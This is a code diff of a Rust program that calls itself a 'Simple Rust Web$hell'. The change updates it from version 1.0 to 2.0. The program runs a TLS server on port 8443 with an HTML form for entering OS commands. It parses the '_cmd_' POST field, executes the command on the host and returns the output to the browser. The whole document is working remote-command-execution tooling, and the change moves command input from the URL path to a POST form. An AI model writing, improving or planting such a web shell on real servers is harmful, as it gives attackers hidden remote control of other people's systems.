@@ -2,7 +2,7 @@
 //  a simple experiment learning Rust
 
 use std::{
-    io::{prelude::*, BufReader},
+    io::{prelude::*},
     net::{TcpListener, TcpStream}, process::Output,
 };
 
@@ -12,12 +12,15 @@ use urlencoding::decode;
 use native_tls::{Identity, TlsAcceptor, TlsStream};
 use std::sync::Arc;
 use std::thread;
+use std::str;
+
 
 // CHANGE HERE THE SERVER PORT
 static PORT: &str = "8443";
 
-// CHANGE THE pfx FILE NAME AT LINE 81
-
+// **************************************
+//  CHANGE THE pfx FILE NAME AT LINE 81 
+// **************************************
 
 fn main() {
 
@@ -88,82 +91,97 @@ fn load_cert(password: &str)-> Result<Identity, native_tls::Error> {
 // webshell logic
 fn handle_connection(mut stream: TlsStream<TcpStream>) {
 
+    let mut buffer = [0; 1024];
+    stream.read(&mut buffer).unwrap();
+    let request = str::from_utf8(&buffer).unwrap();
+    let request_line = request.lines().last().unwrap();
 
-    let buf_reader = BufReader::new(&mut stream);
+    println!("{}", request_line);
 
-    let request_line = buf_reader.lines().next();
+    // set the response status
+    let status = "HTTP/1.1 200 OK";
+    // set the HTML response body       
+    let mut body= String::from(r#"
+        <!DOCTYPE html>
+        <html lang="en;">
+        <head>
+        <meta charset="utf-8">
+        <style>
+            body {background-color:black;color:white}
+            pre {color:yellow}
+        </style>
+        <title>Simple Rust Web$hell</title>
+        </head>
+        <body>
+        <pre>
+       ___                       ___           ___           ___     
+      /\  \          ___        /\  \         /\__\         /\  \    
+     /::\  \        /\  \      /::\  \       /:/  /        /::\  \   
+    /:/\ \  \       \:\  \    /:/\:\  \     /:/  /        /:/\ \  \  
+   _\:\~\ \  \      /::\__\  /::\~\:\  \   /:/  /  ___   _\:\~\ \  \ 
+  /\ \:\ \ \__\  __/:/\/__/ /:/\:\ \:\__\ /:/__/  /\__\ /\ \:\ \ \__\
+  \:\ \:\ \/__/ /\/:/  /    \/_|::\/:/  / \:\  \ /:/  / \:\ \:\ \/__/
+   \:\ \:\__\   \::/__/        |:|::/  /   \:\  /:/  /   \:\ \:\__\  
+    \:\/:/  /    \:\__\        |:|\/__/     \:\/:/  /     \:\/:/  /  
+     \::/  /      \/__/        |:|  |        \::/  /       \::/  /   
+      \/__/                     \|__|         \/__/         \/__/    
+    
+    Ver 2.0 (postman)
+    </pre>
+    <hr>
 
+    <form method="POST" action="/">
+     <div>Insert an OS command</div>
+     <input type="text" name="_cmd_"><input type="submit">
+    </form>                                                                                                    
+
+    "#);
     // check if we get some value in the header req
-    if request_line.is_some(){
+    if request_line.contains("_cmd_") {
        
         //parse the command from the URL
-        let cmd: String = get_cmd_from_req(request_line.unwrap().unwrap());
-
+        let cmd: String = get_cmd_from_req(request_line.to_owned());
+        body.push_str("<hr>");
         // exec the command
         let output = exec_cmd(cmd.to_owned());
-
-        // set the response status
-        let status = "HTTP/1.1 200 OK";
-        // set the HTML response body       
-        let mut body= String::from(r#"
-            <!DOCTYPE html>
-            <html lang="en;">
-            <head>
-            <meta charset="utf-8">
-            <style>
-                body {background-color:black;color:white}
-                pre {color:yellow}
-            </style>
-            <title>Simple Rust Web$hell</title>
-            </head>
-            <body>
-            <pre>
-             _           _          _      _                  _        
-            / /\        /\ \       /\ \   /\_\               / /\      
-           / /  \       \ \ \     /  \ \ / / /         _    / /  \     
-          / / /\ \__    /\ \_\   / /\ \ \\ \ \__      /\_\ / / /\ \__  
-         / / /\ \___\  / /\/_/  / / /\ \_\\ \___\    / / // / /\ \___\ 
-         \ \ \ \/___/ / / /    / / /_/ / / \__  /   / / / \ \ \ \/___/ 
-          \ \ \      / / /    / / /__\/ /  / / /   / / /   \ \ \       
-      _    \ \ \    / / /    / / /_____/  / / /   / / /_    \ \ \      
-     /_/\__/ / /___/ / /__  / / /\ \ \   / / /___/ / //_/\__/ / /      
-     \ \/___/ //\__\/_/___\/ / /  \ \ \ / / /____\/ / \ \/___/ /       
-      \_____\/ \/_________/\/_/    \_\/ \/_________/   \_____\/    1.0                                                                                   
-            </pre>
-        <hr>                                                                                                    
-  
-        "#);
         //put into the response the command output and eventually the error
         body.push_str(&String::from_utf8_lossy(&output.stdout).replace('\n', "</br>"));
         body.push_str(&String::from_utf8_lossy(&output.stderr));
-        //close the body
-        body.push_str("</body></html>");
-
-        let resp_len = body.len();
-        // format the replay
-        let replay = format!(
-            "{status}\r\nContent-Length: {resp_len}\r\n\r\n{body}"
-        );
-        //write the response into the TLS stream
-        stream.write_all(replay.as_bytes()).unwrap();
     };
+    //close the body
+    body.push_str("</body></html>");
+
+    let resp_len = body.len();
+    // format the replay
+    let replay = format!(
+        "{status}\r\nContent-Length: {resp_len}\r\n\r\n{body}"
+    );
+    //write the response into the TLS stream
+    stream.write_all(replay.as_bytes()).unwrap();
+    
 
 }
 
-// parse the command as canonical URL: https://<server IP>:8443/<cmd>
-//  e.g. https://127.0.0.1:8443/whoami
-fn get_cmd_from_req(first_header:String) -> String {
 
+fn get_cmd_from_req(body:String) -> String {
+
+    let mut cmd;
     //slice the URL to get only the
-    let out = first_header.find("HTTP").unwrap();
-    let mut start = first_header.find("/").unwrap();
-    start = start+1;
-
-    let cmd: String =first_header.get(start..out).unwrap().to_string();
+    let start = body.find("=").unwrap() +1;
+    if body.contains("\0"){
+        let out = body.find("\0").unwrap();
+        cmd = body.get(start..out).unwrap().to_string();
+    }
+    else {
+        cmd = body.get(start..).unwrap().to_string();
+    }
+    //trim the command
+    cmd = cmd.trim().to_owned();
     //eventually decode the URL
     let dec_cmd = decode(&cmd);
-
-    return dec_cmd.expect("Unable to decode the command").to_string();
+    
+    //since the data comes from post the encoded + is not decoded, we do manually
+    return str::replace(&dec_cmd.expect("Unable to decode the command").to_string(),"+"," ");
 
 }
 //exec the shell command
